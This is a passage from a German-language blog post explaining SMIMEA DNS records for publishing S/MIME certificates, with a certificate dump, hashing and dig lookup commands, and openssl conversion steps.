29:99:2f:19:9d:59:f3:8d:54:98:8d:77:b6:1e:74:\n                    0c:bf:47\n                Exponent: 65537 (0x10001)\n        X509v3 extensions:\n            X509v3 Basic Constraints: critical\n                CA:FALSE\n            X509v3 CRL Distribution Points: \n                Full Name:\n                  URI:http://csmimersaca.crl.certum.pl/csmimersaca.crl\n            Authority Information Access: \n                OCSP - URI:http://csmimersaca.ocsp-certum.com\n                CA Issuers - URI:http://csmimersaca.repository.certum.pl/csmimersaca.cer\n            X509v3 Authority Key Identifier: \n                66:FB:C3:0F:BE:F4:BF:E0:9C:C9:AB:4D:DE:47:19:BD:C0:CA:A6:68\n            X509v3 Subject Key Identifier: \n                8D:8C:10:2E:11:D8:70:04:F7:DD:B4:E0:4F:F0:17:81:88:8A:32:A0\n            X509v3 Certificate Policies: \n                Policy: 2.23.140.1.5.4.2\n                Policy: 1.2.616.1.113527.2.100.1.1\n                  CPS: https://www.certum.pl/CPS\n            X509v3 Extended Key Usage: \n                E-mail Protection, TLS Web Client Authentication\n            X509v3 Key Usage: critical\n                Digital Signature, Non Repudiation, Key Encipherment, Data Encipherment\n            X509v3 Subject Alternative Name: \n                email:kernel-error@kernel-error.com\n    Signature Algorithm: sha256WithRSAEncryption\n    Signature Value:\n        70:72:47:99:f0:5c:f4:c8:21:85:4f:43:bd:95:0b:b6:08:b9:\n        89:04:63:49:21:4f:9d:0e:ec:79:f7:3a:59:db:f4:06:36:08:\n        fe:5a:7a:7f:a5:0c:d4:6a:15:48:60:18:eb:9c:33:44:18:08:\n        4d:8f:97:fe:32:ea:21:cc:ba:fe:90:2b:f6:47:2d:b6:ca:60:\n        d7:9e:be:09:91:9a:fa:06:52:d9:2c:b1:3b:50:64:00:ba:f4:\n        77:4f:32:63:96:7a:49:54:8a:6f:72:3a:dc:bb:71:5a:f7:97:\n        05:09:9e:5e:c8:4e:28:3d:af:a3:46:59:08:f4:14:8c:2b:15:\n        3c:41:d0:51:c9:42:95:d4:f0:42:54:21:7d:1c:8e:48:df:59:\n        d9:2e:cb:cb:4a:87:2e:c7:28:a9:54:da:f7:b6:61:de:80:37:\n        f7:f1:03:39:36:12:14:16:39:01:ac:fe:98:f3:d5:97:a6:7d:\n        be:87:a8:ee:1f:ec:33:db:71:71:2f:49:07:e0:f3:b1:17:1e:\n        91:76:15:81:89:ac:82:29:b2:6b:36:9c:0f:e2:bb:d5:96:4c:\n        a2:ab:fc:7d:95:54:85:05:61:02:84:4e:84:e8:f7:9e:0f:30:\n        bf:41:d5:f4:2b:3c:4f:4c:ca:9b:f9:33:4d:57:28:51:84:73:\n        a0:e6:1a:3a:fc:88:f5:90:34:f2:71:54:6b:5d:80:6d:86:f1:\n        e8:bc:6b:54:b4:e0:5f:80:c4:48:35:dc:c2:c5:34:e4:19:f6:\n        3b:bf:db:30:5c:17:33:b4:2d:d2:cc:57:95:87:6f:00:4f:18:\n        c2:e4:d6:4b:2c:9f:c6:93:95:90:be:32:50:1b:6a:6c:ed:b1:\n        9b:5f:bf:47:88:7c:76:e1:4c:99:a3:6d:46:e9:9b:5c:76:78:\n        2e:4e:34:5e:cb:37:e8:88:63:03:c8:48:49:ad:c8:bd:e1:af:\n        4e:3a:80:96:ae:e4:07:a4:06:99:d5:c0:00:ad:cd:16:a4:80:\n        5d:df:8f:b2:08:ff:b9:02:ef:14:03:1c:ff:be:3c:0d:c0:35:\n        88:eb:f1:55:57:b3:b1:02:9b:2c:d1:96:06:4b:c0:de:e1:f1:\n        1d:12:39:18:25:b8:6c:b3:4a:6f:be:bb:ad:43:b0:fe:0e:a4:\n        33:01:f9:3d:0b:26:ac:ed:18:2b:1e:27:06:3a:e5:78:c0:03:\n        d4:d4:49:81:32:b8:d9:80:53:27:54:cf:fb:d9:e6:d8:91:76:\n        15:b6:2a:e0:82:95:fc:46:39:1a:a0:fd:98:15:fd:d8:22:d9:\n        5e:9b:75:73:ca:35:47:7d:59:b9:8d:e4:85:20:65:f5:8f:b6:\n        0e:0e:62:0d:3e:2f:5c:ad\n\n\n\n\nBeide Skripte findet ihr auf GitHub, damit ihr sie nutzen oder verbessern könnt.\n\n\n\nWarum habe ich geschrieben, dass ich nichts Zuverlässiges finden konnte? Nun, oft stoße ich auf Anleitungen, die noch auf TYPE53 basieren. Das ist nötig, wenn Bind9 den eigentlichen RR-Type noch nicht kennt – also ein klares Zeichen dafür, dass es sich um eine sehr frühe Implementierung handelt.\n\n\n\nEin weiteres häufiges Problem: Der Hash des Local-Parts wird einfach weggelassen. Stattdessen erfolgen die Abfragen direkt auf _smimecert., was aber falsch ist. Ohne den SHA256-Hash des Local-Parts gibt es keine eindeutige Zuordnung zur jeweiligen E-Mail-Adresse.\n\n\n\nWarum ist der SMIMEA-DNS-Record so aufgebaut? Ganz einfach:\n\n\n\nDer erste Teil, also , sorgt dafür, dass nicht einfach jeder direkt aus der DNS-Zone die E-Mail-Adressen auslesen kann. Statt die E-Mail-Adresse im Klartext zu speichern, wird stattdessen nur der SHA256-Hash des Local-Parts (also der Teil vor dem @) genutzt. Das bedeutet: Wer die genaue E-Mail-Adresse kennt, kann den passenden DNS-Eintrag finden – aber jemand, der einfach nur blind durch die Zone scannt, sieht nur Hashes und kann damit nichts anfangen.\n\n\n\nDer _smimecert-Prefix zeigt an, dass es sich um einen SMIMEA-Record handelt, ähnlich wie es bei ._tcp. für SRV-Records oder _acme-challenge. für Let’s Encrypt-Zertifikate der Fall ist.\n\n\n\nUnd schließlich kommt die Domain, zu der die E-Mail-Adresse gehört.\n\n\n\nZusammen ergibt das einen sicheren, einfach abfragbaren und nicht direkt durchsuchbaren DNS-Eintrag für dein S/MIME-Zertifikat.\n\n\n\nMöchte man die Abfrage manuell mit dig für die E-Mail-Adresse „kernel-error@kernel-error.com“ durchführen, muss man zuerst den Local-Part der E-Mail-Adresse (kernel-error) mit SHA256 hashen. Laut RFC 8162, Abschnitt 3.1 wird der SHA-256-Hash auf die ersten 28 Bytes (56 Hex-Zeichen) gekürzt, um die DNS-Label-Längenbeschränkung von 63 Zeichen pro Label (RFC 1035, Abschnitt 2.3.4) einzuhalten.\n\n\n\necho -n \"kernel-error\" | sha256sum | awk '{print $1}' | cut -c1-56\n70e1c7d87e825b3aba45e2a478025ea0d91d298038436abde5a4c2d0\n\n\n\nAnschließend kann man die dig-Abfrage korrekt zusammensetzen:\n\n\n\ndig +dnssec +short 70e1c7d87e825b3aba45e2a478025ea0d91d298038436abde5a4c2d0._smimecert.kernel-error.com. SMIMEA\n3 0 0 30820714308204FCA003020102021073C13C478DA7B114B871F00737 F1B0FB300D06092A864886F70D01010B0500304E310B300906035504 061302504C3121301F060355040A0C1841737365636F204461746120 53797374656D7320532E412E311C301A06035504030C134365727475 6D20534D494D4520525341204341301E170D32353033313331333431 35355A170D3237303331333133343135345A30783114301206035504 040C0B76616E206465204D65657231123010060355042A0C09536562 61737469616E311E301C06035504030C1553656261737469616E2076 616E206465204D656572312C302A06092A864886F70D010901161D6B 65726E656C2D6572726F72406B65726E656C2D6572726F722E636F6D 30820222300D06092A864886F70D01010105000382020F003082020A 0282020100D0A90BC53ABA0408543FE600F0F71C17BE7EB4A8996A8E F5E9122AAC8E7F39D627186617C4D6CA734E1A9E6302F8076065EA93 D762542D2C12BFF32D5D4942B9A8AA84E2E63CE9B843C1665C014A65 72A42E376ED0629694FCC942FE53D76052A40CDAB1257A1D501D9C65 DE18F27C5490A24181498A202E56F4DC0FDCBFE94766F96EBF47C872 3744ABD69DC684417106DF3D4F12FD52A13B786490366DBF6CB5A843 621CD686B06D072FD7D486BD0AC706021D137A365718DCD8709D55B6 4428F8DB56B268BDBED463A25231B40566C041A48958BE1767E27E21 881D2109935C02F27EA306B64997683EEFDF8685F4F090AB09692F23 2CD34AC7FF2296768CED62C68C37B4C3DD9F04EC9F5C9BB9F712A503 2AC2F83D68DA756E4F2886A6F65889CFAEA0C15E3624EA3D9E3EFF91 D68606F7B7B1B7120035AD4F71369E6D79977B4B2CC3575AC51CAF41 9E795B78822DD36B6D0B0E4622BCE55F7B27FCB52FDCD6A4FBD33EF0 9F897CADA2E793D1509DE54773B3FBE9091CEA2E27A41CBA38A08BBB E1B15BF56EB35B21D66F5B1B1CC6FDD6362AA88A4010F3D2732F071A 841BC765D6F74C3B430D036A327918D08156BA2882D78113DD156335 99319F4BD5D4F12E1F0102BA33766ADF09DC58323246D20BAC815BE5 B8822C260EFBB07ADBAB98FA42F31650FEFAE5D679D4AD29992F199D 59F38D54988D77B61E740CBF470203010001A38201C2308201BE300C 0603551D130101FF0402300030410603551D1F043A30383036A034A0 328630687474703A2F2F63736D696D6572736163612E63726C2E6365 7274756D2E706C2F63736D696D6572736163612E63726C3081830608 2B0601050507010104773075302E06082B0601050507300186226874 74703A2F2F63736D696D6572736163612E6F6373702D63657274756D 2E636F6D304306082B060105050730028637687474703A2F2F63736D 696D6572736163612E7265706F7369746F72792E63657274756D2E70 6C2F63736D696D6572736163612E636572301F0603551D2304183016 801466FBC30FBEF4BFE09CC9AB4DDE4719BDC0CAA668301D0603551D 0E041604148D8C102E11D87004F7DDB4E04FF01781888A32A0304C06 03551D20044530433009060767810C010504023036060B2A84680186 F677026401013027302506082B06010505070201161968747470733A 2F2F7777772E63657274756D2E706C2F435053301D0603551D250416 301406082B0601050507030406082B06010505070302300E0603551D 0F0101FF0404030204F030280603551D110421301F811D6B65726E65 6C2D6572726F72406B65726E656C2D6572726F722E636F6D300D0609 2A864886F70D01010B0500038202010070724799F05CF4C821854F43 BD950BB608B989046349214F9D0EEC79F73A59DBF4063608FE5A7A7F A50CD46A15486018EB9C334418084D8F97FE32EA21CCBAFE902BF647 2DB6CA60D79EBE09919AFA0652D92CB13B506400BAF4774F3263967A 49548A6F723ADCBB715AF79705099E5EC84E283DAFA3465908F4148C 2B153C41D051C94295D4F04254217D1C8E48DF59D92ECBCB4A872EC7 28A954DAF7B661DE8037F7F10339361214163901ACFE98F3D597A67D BE87A8EE1FEC33DB71712F4907E0F3B1171E9176158189AC8229B26B 369C0FE2BBD5964CA2ABFC7D955485056102844E84E8F79E0F30BF41 D5F42B3C4F4CCA9BF9334D5728518473A0E61A3AFC88F59034F27154 6B5D806D86F1E8BC6B54B4E05F80C44835DCC2C534E419F63BBFDB30 5C1733B42DD2CC5795876F004F18C2E4D64B2C9FC6939590BE32501B 6A6CEDB19B5FBF47887C76E14C99A36D46E99B5C76782E4E345ECB37 E8886303C84849ADC8BDE1AF4E3A8096AEE407A40699D5C000ADCD16 A4805DDF8FB208FFB902EF14031CFFBE3C0DC03588EBF15557B3B102 9B2CD196064BC0DEE1F11D12391825B86CB34A6FBEBBAD43B0FE0EA4 3301F93D0B26ACED182B1E27063AE578C003D4D4498132B8D9805327 54CFFBD9E6D8917615B62AE08295FC46391AA0FD9815FDD822D95E9B 7573CA35477D59B98DE4852065F58FB60E0E620D3E2F5CAD\n\n\n\n\nWas bedeutet das?3 → Gibt an, dass es sich um einen S/MIMEA-Record handelt. Die Zahl steht für den sogenannten „Usage“-Wert, also wie das Zertifikat genutzt wird. In diesem Fall bedeutet 3, dass es für eine End-Entity-Zertifizierung gedacht ist, also für die tatsächliche E-Mail-Verschlüsselung und Signatur.0 → Der „Selector“-Wert. Hier steht 0, was bedeutet, dass der gesamte Public Key aus dem Zertifikat gespeichert wird. Alternativ könnte 1 stehen, dann wäre nur der „Subject Public Key Info“-Teil enthalten.0 → Gibt an, welche Hash-Funktion verwendet wird. Ist es 1, steht es für SHA-256 steht. Alternativ könnte 2 für SHA-512 verwendet werden oder, wie in unserem Fall 0, was für das komplette Zertifikat steht.Hexwerte → Das ist der eigentliche Zertifikatsinhalt, also der öffentliche Schlüssel in hexadezimaler Darstellung.\n\n\n\nMöchte man den kompletten DNS-Record einmal manuell auf der Konsole prüfen, geht das wie folgt:\n\n\n\ndig +short 70e1c7d87e825b3aba45e2a478025ea0d91d298038436abde5a4c2d0._smimecert.kernel-error.com SMIMEA | sed 's/^3 0 0 //' | tr -d '[:space:]' > dns_cert.hex\n\n\n\nDamit holen wir uns den SMIMEA-Eintrag, entfernen die vorderen 3 0 0, da diese nur die Nutzungsparameter angeben, und speichern den reinen HEX-Wert in eine Datei.\n\n\n\nxxd -r -p dns_cert.hex dns_cert.der\n\n\n\nHier wandeln wir den HEX-String in eine binäre DER-Datei um.\n\n\n\nopenssl x509 -inform DER -in dns_cert.der -text -noout\n\n\n\nSo kann man sich das Zertifikat im lesbaren Format anzeigen lassen.\n\n\n\nUnd nun?\n\n\n\nSMIMEA ist leider noch immer nicht besonders weit verbreitet. Das liegt sicherlich daran, dass das RFC noch immer experimental ist, aber auch daran, dass es auf weiteren Techniken aufbaut, die ebenfalls eher selten genutzt werden. So braucht man SMIMEA nur, wenn man überhaupt selbst ein S/MIME-Zertifikat zur Signatur und Verschlüsselung von E-Mails verwendet. Zusätzlich muss die Domain per DNSSEC geschützt sein – was noch weniger verbreitet ist – und dann muss auch noch der zusätzliche Mehrwert von SMIMEA verstanden werden.\n\n\n\nDenn SMIMEA verteilt nicht nur die Zertifikate, sondern macht einen direkt initial verschlüsselt erreichbar. Wenn man der Empfänger einer solchen signierten Nachricht ist, kann man das Zertifikat zudem gegen eine vertrauenswürdige DNS-Zone halten und sich so vergewissern, dass es wirklich die Signatur des Absenders ist – ähnlich wie bei TLSA/DANE.\n\n\n\nIhr kennt das doch mit der Sicherheit im Internet: Sie ist nur relevant, wenn man damit Geld verdienen kann oder wenn man Opfer geworden ist. Die Implementierung von SMIMEA ist also aktuell sehr überschaubar. Es gibt Milter für beispielsweise Postfix oder Plugins für Thunderbird, aber vor allem im Enterprise-Umfeld ist mir momentan keine funktionierende Lösung bekannt.\n\n\n\nPffff… Eigentlich wollte ich doch nur schnell schreiben, dass ich da zwei Python-Skripte zusammengebastelt habe – und am Ende ist es doch wieder so ein riesiges Ding geworden. \n\n\n\nAber ich denke, vor allem der Teil mit dem gekürzten Hash des Local-Parts der E-Mail-Adresse ist wichtig zu erklären. Das ist echt eine verrückte Konstruktion. Klar, das hat seinen Sinn, aber zumindest ich bin damals genau an diesem Punkt hängen geblieben.\n\n\n\nNaja, jetzt könnt ihr die Skripte nutzen und euch den ganzen Fummel selbst auf der CLI anschauen, testen und vor allem auch verstehen.\n\n\n\nViel Spaß! \n\n\n\n\n\n\n\nB.t.w.: Das einzig korrekt funktionierende online Tool, was ich finden konnte ist: https://www.co.tt/smimea.cgi\n\n\n\nAlle anderen sind nicht erreichbar, halten sich nicht ans RFC oder ich war zu blöde, sie zu bedienen."
  }
]
